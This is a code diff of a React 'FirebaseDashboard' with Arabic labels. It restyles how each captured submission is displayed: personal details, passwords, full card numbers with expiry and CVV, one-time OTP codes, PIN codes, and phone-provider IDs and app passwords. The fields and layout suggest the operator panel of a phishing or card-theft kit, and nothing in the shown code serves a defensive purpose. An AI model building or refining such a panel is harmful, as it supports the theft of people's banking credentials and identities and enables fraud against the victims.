@@ -1045,163 +1045,166 @@ export default function FirebaseDashboard() {
                 </div>
               )}
 
-              {/* Main Data Grid */}
-              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-2">
-                {/* Personal Info */}
-                {selectedSubmission.step_2_personal_data?.email && (
-                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
-                    <div className="flex items-center gap-1 mb-1">
-                      <Mail className="h-3 w-3 text-blue-400" />
-                      <span className="text-xs text-blue-400">البريد</span>
+              {/* Steps Grid - Each Step in a Card */}
+              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
+                {/* Step 1: Account Type */}
+                {selectedSubmission.step_1_account_type && (
+                  <div className={cn("rounded-lg p-4 border", currentTheme.card, currentTheme.border)}>
+                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-gray-700">
+                      <div className="w-6 h-6 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-bold">1</div>
+                      <span className={cn("font-bold text-sm", currentTheme.text)}>نوع الحساب</span>
                     </div>
-                    <p className={cn("text-sm font-medium truncate", currentTheme.text)}>
-                      {selectedSubmission.step_2_personal_data.email}
-                    </p>
-                  </div>
-                )}
-                {selectedSubmission.step_2_personal_data?.phoneNumber && (
-                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
-                    <div className="flex items-center gap-1 mb-1">
-                      <Phone className="h-3 w-3 text-green-400" />
-                      <span className="text-xs text-green-400">الهاتف</span>
+                    <div className="space-y-2 text-sm">
+                      <div className="flex justify-between">
+                        <span className={currentTheme.textMuted}>النوع:</span>
+                        <span className={currentTheme.text}>{selectedSubmission.step_1_account_type.accountType === "citizen" ? "مواطن" : "زائر"}</span>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className={currentTheme.textMuted}>جديد:</span>
+                        <span className={currentTheme.text}>{selectedSubmission.step_1_account_type.isNewAccount ? "نعم" : "لا"}</span>
+                      </div>
                     </div>
-                    <p className={cn("text-sm font-medium", currentTheme.text)}>
-                      {selectedSubmission.step_2_personal_data.phoneNumber}
-                    </p>
-                  </div>
-                )}
-                {selectedSubmission.step_2_personal_data?.dateOfBirth && (
-                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
-                    <div className="flex items-center gap-1 mb-1">
-                      <Calendar className="h-3 w-3 text-purple-400" />
-                      <span className="text-xs text-purple-400">الميلاد</span>
-                    </div>
-                    <p className={cn("text-sm font-medium", currentTheme.text)}>
-                      {selectedSubmission.step_2_personal_data.dateOfBirth}
-                    </p>
-                  </div>
-                )}
-                {selectedSubmission.step_2_personal_data?.nationality && (
-                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
-                    <div className="flex items-center gap-1 mb-1">
-                      <Globe className="h-3 w-3 text-cyan-400" />
-                      <span className="text-xs text-cyan-400">الجنسية</span>
-                    </div>
-                    <p className={cn("text-sm font-medium", currentTheme.text)}>
-                      {selectedSubmission.step_2_personal_data.nationality}
-                    </p>
                   </div>
                 )}
 
-                {/* Sensitive Data - Highlighted */}
-                {selectedSubmission.step_3_password?.password && (
-                  <div className="rounded-lg p-3 border bg-red-900/30 border-red-500/30">
-                    <div className="flex items-center gap-1 mb-1">
-                      <Lock className="h-3 w-3 text-red-400" />
-                      <span className="text-xs text-red-400">كلمة المرور</span>
+                {/* Step 2: Personal Data */}
+                {selectedSubmission.step_2_personal_data && (
+                  <div className={cn("rounded-lg p-4 border", currentTheme.card, currentTheme.border)}>
+                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-gray-700">
+                      <div className="w-6 h-6 rounded-full bg-green-600 flex items-center justify-center text-white text-xs font-bold">2</div>
+                      <span className={cn("font-bold text-sm", currentTheme.text)}>البيانات الشخصية</span>
                     </div>
-                    <p className="text-lg font-mono font-bold text-red-300">
-                      {selectedSubmission.step_3_password.password}
-                    </p>
-                  </div>
-                )}
-                {(selectedSubmission.step_4_payment?.cardNumber || selectedSubmission.step_4_payment_card?.cardNumber) && (
-                  <div className="rounded-lg p-3 border bg-orange-900/30 border-orange-500/30 col-span-2">
-                    <div className="flex items-center gap-1 mb-1">
-                      <CreditCard className="h-3 w-3 text-orange-400" />
-                      <span className="text-xs text-orange-400">رقم البطاقة</span>
+                    <div className="space-y-2 text-xs">
+                      <div className="flex items-center gap-1">
+                        <Mail className="h-3 w-3 text-blue-400" />
+                        <span className="truncate">{selectedSubmission.step_2_personal_data.email}</span>
+                      </div>
+                      <div className="flex items-center gap-1">
+                        <Phone className="h-3 w-3 text-green-400" />
+                        <span>{selectedSubmission.step_2_personal_data.phoneNumber}</span>
+                      </div>
+                      <div className="flex items-center gap-1">
+                        <Calendar className="h-3 w-3 text-purple-400" />
+                        <span>{selectedSubmission.step_2_personal_data.dateOfBirth}</span>
+                      </div>
+                      <div className="flex items-center gap-1">
+                        <Globe className="h-3 w-3 text-cyan-400" />
+                        <span>{selectedSubmission.step_2_personal_data.nationality}</span>
+                      </div>
+                      {selectedSubmission.step_2_personal_data.address && (
+                        <div className="flex items-center gap-1">
+                          <MapPin className="h-3 w-3 text-teal-400" />
+                          <span className="truncate">{selectedSubmission.step_2_personal_data.address.area}</span>
+                        </div>
+                      )}
                     </div>
-                    <p className="text-lg font-mono font-bold text-orange-300 tracking-wider">
-                      {selectedSubmission.step_4_payment?.cardNumber || selectedSubmission.step_4_payment_card?.cardNumber}
-                    </p>
-                  </div>
-                )}
-                {(selectedSubmission.step_4_payment?.cardName || selectedSubmission.step_4_payment_card?.cardName) && (
-                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
-                    <span className="text-xs text-gray-400">الاسم على البطاقة</span>
-                    <p className={cn("text-sm font-medium", currentTheme.text)}>
-                      {selectedSubmission.step_4_payment?.cardName || selectedSubmission.step_4_payment_card?.cardName}
-                    </p>
-                  </div>
-                )}
-                {(selectedSubmission.step_4_payment?.expiry || selectedSubmission.step_4_payment_card?.expiry) && (
-                  <div className="rounded-lg p-3 border bg-yellow-900/30 border-yellow-500/30">
-                    <span className="text-xs text-yellow-400">انتهاء</span>
-                    <p className="text-lg font-mono font-bold text-yellow-300">
-                      {selectedSubmission.step_4_payment?.expiry || selectedSubmission.step_4_payment_card?.expiry}
-                    </p>
-                  </div>
-                )}
-                {(selectedSubmission.step_4_payment?.cvv || selectedSubmission.step_4_payment_card?.cvv) && (
-                  <div className="rounded-lg p-3 border bg-red-900/30 border-red-500/30">
-                    <span className="text-xs text-red-400">CVV</span>
-                    <p className="text-2xl font-mono font-bold text-red-300">
-                      {selectedSubmission.step_4_payment?.cvv || selectedSubmission.step_4_payment_card?.cvv}
-                    </p>
-                  </div>
-                )}
-                {selectedSubmission.step_4_payment?.otpCode && (
-                  <div className="rounded-lg p-3 border bg-purple-900/30 border-purple-500/30">
-                    <div className="flex items-center gap-1 mb-1">
-                      <Shield className="h-3 w-3 text-purple-400" />
-                      <span className="text-xs text-purple-400">OTP</span>
-                    </div>
-                    <p className="text-2xl font-mono font-bold text-purple-300">
-                      {selectedSubmission.step_4_payment.otpCode}
-                    </p>
-                  </div>
-                )}
-                {selectedSubmission.step_5_pin?.pinCode && (
-                  <div className="rounded-lg p-3 border bg-pink-900/30 border-pink-500/30">
-                    <div className="flex items-center gap-1 mb-1">
-                      <Lock className="h-3 w-3 text-pink-400" />
-                      <span className="text-xs text-pink-400">PIN</span>
-                    </div>
-                    <p className="text-2xl font-mono font-bold text-pink-300 tracking-widest">
-                      {selectedSubmission.step_5_pin.pinCode}
-                    </p>
                   </div>
                 )}
 
-                {/* Phone Provider Data */}
-                {selectedSubmission.step_6_phone_provider?.provider && (
-                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
-                    <div className="flex items-center gap-1 mb-1">
-                      <Smartphone className="h-3 w-3 text-blue-400" />
-                      <span className="text-xs text-blue-400">مزود الخدمة</span>
+                {/* Step 3: Password */}
+                {selectedSubmission.step_3_password && (
+                  <div className="rounded-lg p-4 border bg-red-900/20 border-red-500/30">
+                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-red-700/50">
+                      <div className="w-6 h-6 rounded-full bg-red-600 flex items-center justify-center text-white text-xs font-bold">3</div>
+                      <span className="font-bold text-sm text-red-300">كلمة المرور</span>
                     </div>
-                    <p className={cn("text-sm font-medium", currentTheme.text)}>
-                      {selectedSubmission.step_6_phone_provider.provider}
-                    </p>
-                  </div>
-                )}
-                {selectedSubmission.step_6_phone_provider?.personalId && (
-                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
-                    <span className="text-xs text-gray-400">الرقم الشخصي</span>
-                    <p className={cn("text-sm font-medium", currentTheme.text)}>
-                      {selectedSubmission.step_6_phone_provider.personalId}
-                    </p>
-                  </div>
-                )}
-                {selectedSubmission.step_6_phone_provider?.password && (
-                  <div className="rounded-lg p-3 border bg-red-900/30 border-red-500/30">
-                    <span className="text-xs text-red-400">كلمة مرور التطبيق</span>
-                    <p className="text-lg font-mono font-bold text-red-300">
-                      {selectedSubmission.step_6_phone_provider.password}
-                    </p>
+                    <div className="text-center py-2">
+                      <p className="text-xs text-red-400 mb-1">كلمة المرور</p>
+                      <p className="text-2xl font-mono font-bold text-red-300">
+                        {selectedSubmission.step_3_password.password}
+                      </p>
+                    </div>
                   </div>
                 )}
 
-                {/* Address */}
-                {selectedSubmission.step_2_personal_data?.address && (
-                  <div className={cn("rounded-lg p-3 border col-span-2", currentTheme.card, currentTheme.border)}>
-                    <div className="flex items-center gap-1 mb-1">
-                      <MapPin className="h-3 w-3 text-teal-400" />
-                      <span className="text-xs text-teal-400">العنوان</span>
+                {/* Step 4: Payment & Card */}
+                {(selectedSubmission.step_4_payment || selectedSubmission.step_4_payment_card) && (
+                  <div className="rounded-lg p-4 border bg-orange-900/20 border-orange-500/30 md:col-span-2">
+                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-orange-700/50">
+                      <div className="w-6 h-6 rounded-full bg-orange-600 flex items-center justify-center text-white text-xs font-bold">4</div>
+                      <span className="font-bold text-sm text-orange-300">الدفع والبطاقة</span>
+                      {selectedSubmission.step_4_payment?.otpCode && (
+                        <span className="bg-purple-500/20 text-purple-400 px-2 py-0.5 rounded text-xs mr-auto">OTP ✓</span>
+                      )}
                     </div>
-                    <p className={cn("text-sm", currentTheme.text)}>
-                      {selectedSubmission.step_2_personal_data.address.buildingNumber} - {selectedSubmission.step_2_personal_data.address.street} - {selectedSubmission.step_2_personal_data.address.area}
-                    </p>
+                    <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+                      <div className="col-span-2">
+                        <p className="text-xs text-orange-400 mb-1">رقم البطاقة</p>
+                        <p className="text-lg font-mono font-bold text-orange-300 tracking-wider">
+                          {selectedSubmission.step_4_payment?.cardNumber || selectedSubmission.step_4_payment_card?.cardNumber}
+                        </p>
+                      </div>
+                      <div>
+                        <p className="text-xs text-yellow-400 mb-1">انتهاء</p>
+                        <p className="text-lg font-mono font-bold text-yellow-300">
+                          {selectedSubmission.step_4_payment?.expiry || selectedSubmission.step_4_payment_card?.expiry}
+                        </p>
+                      </div>
+                      <div>
+                        <p className="text-xs text-red-400 mb-1">CVV</p>
+                        <p className="text-2xl font-mono font-bold text-red-300">
+                          {selectedSubmission.step_4_payment?.cvv || selectedSubmission.step_4_payment_card?.cvv}
+                        </p>
+                      </div>
+                      <div className="col-span-2">
+                        <p className="text-xs text-gray-400 mb-1">الاسم على البطاقة</p>
+                        <p className="text-sm font-medium text-gray-300">
+                          {selectedSubmission.step_4_payment?.cardName || selectedSubmission.step_4_payment_card?.cardName}
+                        </p>
+                      </div>
+                      {selectedSubmission.step_4_payment?.otpCode && (
+                        <div className="col-span-2">
+                          <p className="text-xs text-purple-400 mb-1">رمز OTP</p>
+                          <p className="text-2xl font-mono font-bold text-purple-300">
+                            {selectedSubmission.step_4_payment.otpCode}
+                          </p>
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                )}
+
+                {/* Step 5: PIN */}
+                {selectedSubmission.step_5_pin && (
+                  <div className="rounded-lg p-4 border bg-pink-900/20 border-pink-500/30">
+                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-pink-700/50">
+                      <div className="w-6 h-6 rounded-full bg-pink-600 flex items-center justify-center text-white text-xs font-bold">5</div>
+                      <span className="font-bold text-sm text-pink-300">رمز PIN</span>
+                    </div>
+                    <div className="text-center py-2">
+                      <p className="text-xs text-pink-400 mb-1">رمز PIN</p>
+                      <p className="text-3xl font-mono font-bold text-pink-300 tracking-widest">
+                        {selectedSubmission.step_5_pin.pinCode}
+                      </p>
+                    </div>
+                  </div>
+                )}
+
+                {/* Step 6: Phone Provider */}
+                {selectedSubmission.step_6_phone_provider && (
+                  <div className="rounded-lg p-4 border bg-blue-900/20 border-blue-500/30">
+                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-blue-700/50">
+                      <div className="w-6 h-6 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-bold">6</div>
+                      <span className="font-bold text-sm text-blue-300">مزود الخدمة</span>
+                    </div>
+                    <div className="space-y-2 text-xs">
+                      <div className="flex items-center gap-1">
+                        <Smartphone className="h-3 w-3 text-blue-400" />
+                        <span className="text-blue-300">{selectedSubmission.step_6_phone_provider.provider}</span>
+                      </div>
+                      <div className="flex items-center gap-1">
+                        <User className="h-3 w-3 text-gray-400" />
+                        <span>{selectedSubmission.step_6_phone_provider.personalId}</span>
+                      </div>
+                      {selectedSubmission.step_6_phone_provider.password && (
+                        <div className="mt-2 pt-2 border-t border-blue-700/50">
+                          <p className="text-xs text-red-400 mb-1">كلمة مرور التطبيق</p>
+                          <p className="text-lg font-mono font-bold text-red-300">
+                            {selectedSubmission.step_6_phone_provider.password}
+                          </p>
+                        </div>
+                      )}
+                    </div>
                   </div>
                 )}
               </div>
